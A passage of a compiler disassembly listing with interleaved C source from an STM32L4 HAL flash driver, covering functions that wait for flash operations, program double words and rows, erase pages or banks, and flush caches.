 80014b2:	4770      	bx	lr
 80014b4:	40022000 	.word	0x40022000

080014b8 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 80014b8:	b580      	push	{r7, lr}
 80014ba:	b084      	sub	sp, #16
 80014bc:	af00      	add	r7, sp, #0
 80014be:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 80014c0:	f7ff fe1a 	bl	80010f8 <HAL_GetTick>
 80014c4:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80014c6:	e00d      	b.n	80014e4 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 80014c8:	687b      	ldr	r3, [r7, #4]
 80014ca:	f1b3 3fff 	cmp.w	r3, #4294967295
 80014ce:	d009      	beq.n	80014e4 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 80014d0:	f7ff fe12 	bl	80010f8 <HAL_GetTick>
 80014d4:	4602      	mov	r2, r0
 80014d6:	68fb      	ldr	r3, [r7, #12]
 80014d8:	1ad3      	subs	r3, r2, r3
 80014da:	687a      	ldr	r2, [r7, #4]
 80014dc:	429a      	cmp	r2, r3
 80014de:	d801      	bhi.n	80014e4 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 80014e0:	2303      	movs	r3, #3
 80014e2:	e036      	b.n	8001552 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80014e4:	4b1d      	ldr	r3, [pc, #116]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 80014e6:	691b      	ldr	r3, [r3, #16]
 80014e8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80014ec:	2b00      	cmp	r3, #0
 80014ee:	d1eb      	bne.n	80014c8 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 80014f0:	4b1a      	ldr	r3, [pc, #104]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 80014f2:	691a      	ldr	r2, [r3, #16]
 80014f4:	4b1a      	ldr	r3, [pc, #104]	; (8001560 <FLASH_WaitForLastOperation+0xa8>)
 80014f6:	4013      	ands	r3, r2
 80014f8:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 80014fa:	68bb      	ldr	r3, [r7, #8]
 80014fc:	2b00      	cmp	r3, #0
 80014fe:	d01e      	beq.n	800153e <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001500:	4b18      	ldr	r3, [pc, #96]	; (8001564 <FLASH_WaitForLastOperation+0xac>)
 8001502:	685a      	ldr	r2, [r3, #4]
 8001504:	68bb      	ldr	r3, [r7, #8]
 8001506:	4313      	orrs	r3, r2
 8001508:	4a16      	ldr	r2, [pc, #88]	; (8001564 <FLASH_WaitForLastOperation+0xac>)
 800150a:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 800150c:	68bb      	ldr	r3, [r7, #8]
 800150e:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001512:	2b00      	cmp	r3, #0
 8001514:	d007      	beq.n	8001526 <FLASH_WaitForLastOperation+0x6e>
 8001516:	4b11      	ldr	r3, [pc, #68]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 8001518:	699a      	ldr	r2, [r3, #24]
 800151a:	68bb      	ldr	r3, [r7, #8]
 800151c:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001520:	490e      	ldr	r1, [pc, #56]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 8001522:	4313      	orrs	r3, r2
 8001524:	618b      	str	r3, [r1, #24]
 8001526:	68bb      	ldr	r3, [r7, #8]
 8001528:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 800152c:	2b00      	cmp	r3, #0
 800152e:	d004      	beq.n	800153a <FLASH_WaitForLastOperation+0x82>
 8001530:	4a0a      	ldr	r2, [pc, #40]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 8001532:	68bb      	ldr	r3, [r7, #8]
 8001534:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001538:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 800153a:	2301      	movs	r3, #1
 800153c:	e009      	b.n	8001552 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 800153e:	4b07      	ldr	r3, [pc, #28]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 8001540:	691b      	ldr	r3, [r3, #16]
 8001542:	f003 0301 	and.w	r3, r3, #1
 8001546:	2b00      	cmp	r3, #0
 8001548:	d002      	beq.n	8001550 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 800154a:	4b04      	ldr	r3, [pc, #16]	; (800155c <FLASH_WaitForLastOperation+0xa4>)
 800154c:	2201      	movs	r2, #1
 800154e:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 8001550:	2300      	movs	r3, #0
}
 8001552:	4618      	mov	r0, r3
 8001554:	3710      	adds	r7, #16
 8001556:	46bd      	mov	sp, r7
 8001558:	bd80      	pop	{r7, pc}
 800155a:	bf00      	nop
 800155c:	40022000 	.word	0x40022000
 8001560:	0002c3fa 	.word	0x0002c3fa
 8001564:	2000000c 	.word	0x2000000c

08001568 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001568:	b480      	push	{r7}
 800156a:	b085      	sub	sp, #20
 800156c:	af00      	add	r7, sp, #0
 800156e:	60f8      	str	r0, [r7, #12]
 8001570:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001574:	4b0e      	ldr	r3, [pc, #56]	; (80015b0 <FLASH_Program_DoubleWord+0x48>)
 8001576:	695b      	ldr	r3, [r3, #20]
 8001578:	4a0d      	ldr	r2, [pc, #52]	; (80015b0 <FLASH_Program_DoubleWord+0x48>)
 800157a:	f043 0301 	orr.w	r3, r3, #1
 800157e:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001580:	68fb      	ldr	r3, [r7, #12]
 8001582:	683a      	ldr	r2, [r7, #0]
 8001584:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001586:	f3bf 8f6f 	isb	sy
}
 800158a:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 800158c:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001590:	f04f 0200 	mov.w	r2, #0
 8001594:	f04f 0300 	mov.w	r3, #0
 8001598:	000a      	movs	r2, r1
 800159a:	2300      	movs	r3, #0
 800159c:	68f9      	ldr	r1, [r7, #12]
 800159e:	3104      	adds	r1, #4
 80015a0:	4613      	mov	r3, r2
 80015a2:	600b      	str	r3, [r1, #0]
}
 80015a4:	bf00      	nop
 80015a6:	3714      	adds	r7, #20
 80015a8:	46bd      	mov	sp, r7
 80015aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80015ae:	4770      	bx	lr
 80015b0:	40022000 	.word	0x40022000

080015b4 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 80015b4:	b480      	push	{r7}
 80015b6:	b089      	sub	sp, #36	; 0x24
 80015b8:	af00      	add	r7, sp, #0
 80015ba:	6078      	str	r0, [r7, #4]
 80015bc:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 80015be:	2340      	movs	r3, #64	; 0x40
 80015c0:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 80015c2:	687b      	ldr	r3, [r7, #4]
 80015c4:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 80015c6:	683b      	ldr	r3, [r7, #0]
 80015c8:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 80015ca:	4b14      	ldr	r3, [pc, #80]	; (800161c <FLASH_Program_Fast+0x68>)
 80015cc:	695b      	ldr	r3, [r3, #20]
 80015ce:	4a13      	ldr	r2, [pc, #76]	; (800161c <FLASH_Program_Fast+0x68>)
 80015d0:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80015d4:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 80015d6:	f3ef 8310 	mrs	r3, PRIMASK
 80015da:	60fb      	str	r3, [r7, #12]
  return(result);
 80015dc:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 80015de:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 80015e0:	b672      	cpsid	i
}
 80015e2:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 80015e4:	697b      	ldr	r3, [r7, #20]
 80015e6:	681a      	ldr	r2, [r3, #0]
 80015e8:	69bb      	ldr	r3, [r7, #24]
 80015ea:	601a      	str	r2, [r3, #0]
    dest_addr++;
 80015ec:	69bb      	ldr	r3, [r7, #24]
 80015ee:	3304      	adds	r3, #4
 80015f0:	61bb      	str	r3, [r7, #24]
    src_addr++;
 80015f2:	697b      	ldr	r3, [r7, #20]
 80015f4:	3304      	adds	r3, #4
 80015f6:	617b      	str	r3, [r7, #20]
    row_index--;
 80015f8:	7ffb      	ldrb	r3, [r7, #31]
 80015fa:	3b01      	subs	r3, #1
 80015fc:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 80015fe:	7ffb      	ldrb	r3, [r7, #31]
 8001600:	2b00      	cmp	r3, #0
 8001602:	d1ef      	bne.n	80015e4 <FLASH_Program_Fast+0x30>
 8001604:	693b      	ldr	r3, [r7, #16]
 8001606:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001608:	68bb      	ldr	r3, [r7, #8]
 800160a:	f383 8810 	msr	PRIMASK, r3
}
 800160e:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001610:	bf00      	nop
 8001612:	3724      	adds	r7, #36	; 0x24
 8001614:	46bd      	mov	sp, r7
 8001616:	f85d 7b04 	ldr.w	r7, [sp], #4
 800161a:	4770      	bx	lr
 800161c:	40022000 	.word	0x40022000

08001620 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 8001620:	b580      	push	{r7, lr}
 8001622:	b084      	sub	sp, #16
 8001624:	af00      	add	r7, sp, #0
 8001626:	6078      	str	r0, [r7, #4]
 8001628:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800162a:	4b48      	ldr	r3, [pc, #288]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 800162c:	781b      	ldrb	r3, [r3, #0]
 800162e:	2b01      	cmp	r3, #1
 8001630:	d101      	bne.n	8001636 <HAL_FLASHEx_Erase+0x16>
 8001632:	2302      	movs	r3, #2
 8001634:	e085      	b.n	8001742 <HAL_FLASHEx_Erase+0x122>
 8001636:	4b45      	ldr	r3, [pc, #276]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 8001638:	2201      	movs	r2, #1
 800163a:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800163c:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001640:	f7ff ff3a 	bl	80014b8 <FLASH_WaitForLastOperation>
 8001644:	4603      	mov	r3, r0
 8001646:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 8001648:	7bfb      	ldrb	r3, [r7, #15]
 800164a:	2b00      	cmp	r3, #0
 800164c:	d175      	bne.n	800173a <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800164e:	4b3f      	ldr	r3, [pc, #252]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 8001650:	2200      	movs	r2, #0
 8001652:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001654:	4b3e      	ldr	r3, [pc, #248]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001656:	681b      	ldr	r3, [r3, #0]
 8001658:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800165c:	2b00      	cmp	r3, #0
 800165e:	d013      	beq.n	8001688 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001660:	4b3b      	ldr	r3, [pc, #236]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001662:	681b      	ldr	r3, [r3, #0]
 8001664:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001668:	2b00      	cmp	r3, #0
 800166a:	d009      	beq.n	8001680 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 800166c:	4b38      	ldr	r3, [pc, #224]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 800166e:	681b      	ldr	r3, [r3, #0]
 8001670:	4a37      	ldr	r2, [pc, #220]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001672:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001676:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001678:	4b34      	ldr	r3, [pc, #208]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 800167a:	2203      	movs	r2, #3
 800167c:	771a      	strb	r2, [r3, #28]
 800167e:	e016      	b.n	80016ae <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001680:	4b32      	ldr	r3, [pc, #200]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 8001682:	2201      	movs	r2, #1
 8001684:	771a      	strb	r2, [r3, #28]
 8001686:	e012      	b.n	80016ae <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001688:	4b31      	ldr	r3, [pc, #196]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 800168a:	681b      	ldr	r3, [r3, #0]
 800168c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001690:	2b00      	cmp	r3, #0
 8001692:	d009      	beq.n	80016a8 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001694:	4b2e      	ldr	r3, [pc, #184]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001696:	681b      	ldr	r3, [r3, #0]
 8001698:	4a2d      	ldr	r2, [pc, #180]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 800169a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800169e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80016a0:	4b2a      	ldr	r3, [pc, #168]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 80016a2:	2202      	movs	r2, #2
 80016a4:	771a      	strb	r2, [r3, #28]
 80016a6:	e002      	b.n	80016ae <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80016a8:	4b28      	ldr	r3, [pc, #160]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 80016aa:	2200      	movs	r2, #0
 80016ac:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 80016ae:	687b      	ldr	r3, [r7, #4]
 80016b0:	681b      	ldr	r3, [r3, #0]
 80016b2:	2b01      	cmp	r3, #1
 80016b4:	d111      	bne.n	80016da <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 80016b6:	687b      	ldr	r3, [r7, #4]
 80016b8:	685b      	ldr	r3, [r3, #4]
 80016ba:	4618      	mov	r0, r3
 80016bc:	f000 f84a 	bl	8001754 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016c0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016c4:	f7ff fef8 	bl	80014b8 <FLASH_WaitForLastOperation>
 80016c8:	4603      	mov	r3, r0
 80016ca:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 80016cc:	4b20      	ldr	r3, [pc, #128]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 80016ce:	695b      	ldr	r3, [r3, #20]
 80016d0:	4a1f      	ldr	r2, [pc, #124]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 80016d2:	f023 0304 	bic.w	r3, r3, #4
 80016d6:	6153      	str	r3, [r2, #20]
 80016d8:	e02d      	b.n	8001736 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 80016da:	683b      	ldr	r3, [r7, #0]
 80016dc:	f04f 32ff 	mov.w	r2, #4294967295
 80016e0:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80016e2:	687b      	ldr	r3, [r7, #4]
 80016e4:	689b      	ldr	r3, [r3, #8]
 80016e6:	60bb      	str	r3, [r7, #8]
 80016e8:	e01d      	b.n	8001726 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 80016ea:	687b      	ldr	r3, [r7, #4]
 80016ec:	685b      	ldr	r3, [r3, #4]
 80016ee:	4619      	mov	r1, r3
 80016f0:	68b8      	ldr	r0, [r7, #8]
 80016f2:	f000 f84d 	bl	8001790 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016f6:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016fa:	f7ff fedd 	bl	80014b8 <FLASH_WaitForLastOperation>
 80016fe:	4603      	mov	r3, r0
 8001700:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001702:	4b13      	ldr	r3, [pc, #76]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001704:	695b      	ldr	r3, [r3, #20]
 8001706:	4a12      	ldr	r2, [pc, #72]	; (8001750 <HAL_FLASHEx_Erase+0x130>)
 8001708:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 800170c:	f023 0302 	bic.w	r3, r3, #2
 8001710:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001712:	7bfb      	ldrb	r3, [r7, #15]
 8001714:	2b00      	cmp	r3, #0
 8001716:	d003      	beq.n	8001720 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 8001718:	683b      	ldr	r3, [r7, #0]
 800171a:	68ba      	ldr	r2, [r7, #8]
 800171c:	601a      	str	r2, [r3, #0]
          break;
 800171e:	e00a      	b.n	8001736 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001720:	68bb      	ldr	r3, [r7, #8]
 8001722:	3301      	adds	r3, #1
 8001724:	60bb      	str	r3, [r7, #8]
 8001726:	687b      	ldr	r3, [r7, #4]
 8001728:	689a      	ldr	r2, [r3, #8]
 800172a:	687b      	ldr	r3, [r7, #4]
 800172c:	68db      	ldr	r3, [r3, #12]
 800172e:	4413      	add	r3, r2
 8001730:	68ba      	ldr	r2, [r7, #8]
 8001732:	429a      	cmp	r2, r3
 8001734:	d3d9      	bcc.n	80016ea <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001736:	f000 f84f 	bl	80017d8 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 800173a:	4b04      	ldr	r3, [pc, #16]	; (800174c <HAL_FLASHEx_Erase+0x12c>)
 800173c:	2200      	movs	r2, #0
 800173e:	701a      	strb	r2, [r3, #0]

  return status;
 8001740:	7bfb      	ldrb	r3, [r7, #15]
}
 8001742:	4618      	mov	r0, r3
 8001744:	3710      	adds	r7, #16
 8001746:	46bd      	mov	sp, r7
 8001748:	bd80      	pop	{r7, pc}
 800174a:	bf00      	nop
 800174c:	2000000c 	.word	0x2000000c
 8001750:	40022000 	.word	0x40022000

08001754 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001754:	b480      	push	{r7}
 8001756:	b083      	sub	sp, #12
 8001758:	af00      	add	r7, sp, #0
 800175a:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 800175c:	687b      	ldr	r3, [r7, #4]
 800175e:	f003 0301 	and.w	r3, r3, #1
 8001762:	2b00      	cmp	r3, #0
 8001764:	d005      	beq.n	8001772 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001766:	4b09      	ldr	r3, [pc, #36]	; (800178c <FLASH_MassErase+0x38>)
 8001768:	695b      	ldr	r3, [r3, #20]
 800176a:	4a08      	ldr	r2, [pc, #32]	; (800178c <FLASH_MassErase+0x38>)
 800176c:	f043 0304 	orr.w	r3, r3, #4
 8001770:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001772:	4b06      	ldr	r3, [pc, #24]	; (800178c <FLASH_MassErase+0x38>)
 8001774:	695b      	ldr	r3, [r3, #20]
 8001776:	4a05      	ldr	r2, [pc, #20]	; (800178c <FLASH_MassErase+0x38>)
 8001778:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800177c:	6153      	str	r3, [r2, #20]
}
 800177e:	bf00      	nop
 8001780:	370c      	adds	r7, #12
 8001782:	46bd      	mov	sp, r7
 8001784:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001788:	4770      	bx	lr
 800178a:	bf00      	nop
 800178c:	40022000 	.word	0x40022000

08001790 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001790:	b480      	push	{r7}
 8001792:	b083      	sub	sp, #12
 8001794:	af00      	add	r7, sp, #0
 8001796:	6078      	str	r0, [r7, #4]
 8001798:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 800179a:	4b0e      	ldr	r3, [pc, #56]	; (80017d4 <FLASH_PageErase+0x44>)
 800179c:	695b      	ldr	r3, [r3, #20]
 800179e:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 80017a2:	687b      	ldr	r3, [r7, #4]
 80017a4:	00db      	lsls	r3, r3, #3
 80017a6:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 80017aa:	490a      	ldr	r1, [pc, #40]	; (80017d4 <FLASH_PageErase+0x44>)
 80017ac:	4313      	orrs	r3, r2
 80017ae:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 80017b0:	4b08      	ldr	r3, [pc, #32]	; (80017d4 <FLASH_PageErase+0x44>)
 80017b2:	695b      	ldr	r3, [r3, #20]
 80017b4:	4a07      	ldr	r2, [pc, #28]	; (80017d4 <FLASH_PageErase+0x44>)
 80017b6:	f043 0302 	orr.w	r3, r3, #2
 80017ba:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80017bc:	4b05      	ldr	r3, [pc, #20]	; (80017d4 <FLASH_PageErase+0x44>)
 80017be:	695b      	ldr	r3, [r3, #20]
 80017c0:	4a04      	ldr	r2, [pc, #16]	; (80017d4 <FLASH_PageErase+0x44>)
 80017c2:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80017c6:	6153      	str	r3, [r2, #20]
}
 80017c8:	bf00      	nop
 80017ca:	370c      	adds	r7, #12
 80017cc:	46bd      	mov	sp, r7
 80017ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017d2:	4770      	bx	lr
 80017d4:	40022000 	.word	0x40022000

080017d8 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 80017d8:	b480      	push	{r7}
 80017da:	b083      	sub	sp, #12
 80017dc:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 80017de:	4b21      	ldr	r3, [pc, #132]	; (8001864 <FLASH_FlushCaches+0x8c>)
 80017e0:	7f1b      	ldrb	r3, [r3, #28]
 80017e2:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 80017e4:	79fb      	ldrb	r3, [r7, #7]
 80017e6:	2b01      	cmp	r3, #1
 80017e8:	d002      	beq.n	80017f0 <FLASH_FlushCaches+0x18>
 80017ea:	79fb      	ldrb	r3, [r7, #7]
 80017ec:	2b03      	cmp	r3, #3
 80017ee:	d117      	bne.n	8001820 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 80017f0:	4b1d      	ldr	r3, [pc, #116]	; (8001868 <FLASH_FlushCaches+0x90>)
 80017f2:	681b      	ldr	r3, [r3, #0]
 80017f4:	4a1c      	ldr	r2, [pc, #112]	; (8001868 <FLASH_FlushCaches+0x90>)
 80017f6:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 80017fa:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 80017fc:	4b1a      	ldr	r3, [pc, #104]	; (8001868 <FLASH_FlushCaches+0x90>)
 80017fe:	681b      	ldr	r3, [r3, #0]
 8001800:	4a19      	ldr	r2, [pc, #100]	; (8001868 <FLASH_FlushCaches+0x90>)
 8001802:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001806:	6013      	str	r3, [r2, #0]
 8001808:	4b17      	ldr	r3, [pc, #92]	; (8001868 <FLASH_FlushCaches+0x90>)
 800180a:	681b      	ldr	r3, [r3, #0]
 800180c:	4a16      	ldr	r2, [pc, #88]	; (8001868 <FLASH_FlushCaches+0x90>)
